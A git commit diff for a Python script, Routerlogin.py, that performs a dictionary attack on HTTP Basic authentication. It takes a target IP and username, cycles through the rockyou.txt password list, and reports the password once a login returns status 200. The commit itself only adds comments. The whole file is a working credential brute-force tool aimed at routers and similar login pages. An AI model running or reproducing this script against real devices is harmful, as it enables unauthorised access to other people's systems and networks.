6ac78044339fb86b5b349ea9ad49026ec8f64339
treyshotz <mads.lundegaard@live.no>
2019-01-09 18:20:16 +0100

    commented some code

--- Routerlogin.py
+++ Routerlogin.py
@@ -9,8 +9,8 @@ print("Welcome to HTTTPBasic auth dictionary attack")
 ipadr = input("Type the ip address: ")
 username = input("First: Do you have a username you want to try? ")
 
-start = time.time()
-#
+start = time.time() #starts the timer
+
 
 
 #TODO
@@ -18,19 +18,18 @@ start = time.time()
 #Fikse bug med at den ikke printer rett i den første linjen
 
 i = 0
-#adm
-f = open(r'rockyou.txt', 'r', encoding="latin-1")  
+f = open(r'rockyou.txt', 'r', encoding="latin-1") #opens the wordlist
 line = f.readline()
 while line:
     with ThreadPoolExecutor() as executor:
         line = f.readline()
-        print("Line {}: {}".format(i, line.strip()))
-        r = requests.get("http://"+ipadr, auth=HTTPBasicAuth('{}'.format(username.strip()), '{}'.format(line.strip())))
-        i += 1
-        if r.status_code == 200:
+        print("Line {}: {}".format(i, line.strip())) #prints number of try and password tried
+        r = requests.get("http://"+ipadr, auth=HTTPBasicAuth('{}'.format(username.strip()), '{}'.format(line.strip()))) #sends request to the ip and tries to login. Recieves status codes
+        i += 1 #adds a number to the count
+        if r.status_code == 200: #if the status code is positive stops the tries and prints
             print("Password found!")
             print("The password is: {}".format(line.strip()))
             break
 
-end = time.time()
-print(end - start)
+end = time.time() #ends the timer 
+print(end - start) #prints the time used to find the password
